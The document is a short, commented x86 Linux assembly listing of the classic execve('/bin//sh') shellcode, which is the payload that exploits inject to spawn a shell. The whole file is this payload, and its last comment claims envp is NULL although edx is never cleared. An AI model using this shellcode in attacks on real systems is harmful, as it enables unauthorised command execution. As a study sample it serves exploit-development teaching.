section .text
    global _start
_start:
    xor eax, eax          ; eax = 0
    push eax              ; push 0 (null terminator for string)

    push 0x68732f2f       ; push "//sh"
    push 0x6e69622f       ; push "/bin"

    mov ebx, esp          ; ebx = pointer to "/bin//sh"

    push eax              ; push 0 (argv[1] = NULL)
    push ebx              ; push pointer to "/bin//sh" (argv[0])

    mov ecx, esp          ; ecx = argv array pointer

    mov al, 0xb           ; eax = 11 (execve syscall number)
    int 0x80              ; syscall: execve("/bin//sh", argv, NULL)
